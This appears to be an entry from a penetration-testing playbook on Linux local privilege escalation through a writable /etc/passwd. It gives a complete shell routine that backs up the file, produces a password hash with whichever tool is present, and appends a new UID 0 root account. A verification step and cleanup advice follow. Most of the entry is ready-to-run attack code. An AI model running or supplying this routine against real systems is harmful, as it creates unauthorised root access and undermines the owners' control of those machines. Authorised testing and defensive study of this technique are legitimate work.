# LPRIV-19. Writable `/etc/passwd`

**Run this when:** `/etc/passwd` is writable by the current user.

Writable check, backup:

```bash
PASSWD=/etc/passwd
ls -l "$PASSWD"
cp --preserve=all -- "$PASSWD" /tmp/passwd.bak
sha256sum -- "$PASSWD" /tmp/passwd.bak
command -v mkpasswd openssl python3 python2 perl
```

**Look for:** owner write on the file, and any one hash tool in the list. The
account is added to `/etc/passwd` only; `/etc/shadow` stays untouched, so the
hash lives in that second field. Field 2 accepts any crypt(3) hash the box's
glibc understands, not one fixed algorithm.

**If found:** build one line. `test` is the name unless it is taken, and the
shell is whichever the box has.

Hash, append, verify:

```bash
NAME=test
while getent passwd "$NAME" >/dev/null; do NAME="${NAME}0"; done
SHELL_BIN=$(command -v bash || command -v sh || printf '%s' /bin/sh)

HASH=
if command -v mkpasswd >/dev/null 2>&1; then
  HASH=$(mkpasswd -m sha-512 '<PASSWORD>')
fi
if [ -z "$HASH" ] && [ "$(openssl passwd -6 x 2>/dev/null | cut -c1-3)" = '$6$' ]; then
  HASH=$(openssl passwd -6 '<PASSWORD>')
fi
if [ -z "$HASH" ]; then
  HASH=$(python3 -c 'import crypt; print(crypt.crypt("<PASSWORD>", crypt.mksalt(crypt.METHOD_SHA512)))' 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(python2 -c 'import crypt; print crypt.crypt("<PASSWORD>", "$6$test$")' 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(perl -e 'print crypt("<PASSWORD>", q($1$test$))' 2>/dev/null)
fi
if [ -z "$HASH" ]; then
  HASH=$(openssl passwd -1 '<PASSWORD>' 2>/dev/null || openssl passwd -crypt '<PASSWORD>')
fi

printf '%s:%s:0:0:root:/root:%s\n' "$NAME" "$HASH" "$SHELL_BIN" >> "$PASSWD"
getent passwd "$NAME"
```

A usage dump from `openssl passwd -6` is not a failure; it means this OpenSSL
predates 1.1.1 and the chain moves on. An empty `$HASH` after the chain means no
route; then copy field 2 from any account that still holds a hash, or use
`-crypt`, which truncates to eight characters.

`su test` prompts for the password you chose; it is not passwordless. Verify
`id` shows `uid=0`. Remove the line afterwards, or restore the copy when the file
must stay byte-exact. A second UID 0 account is a real login, not a modified
user.
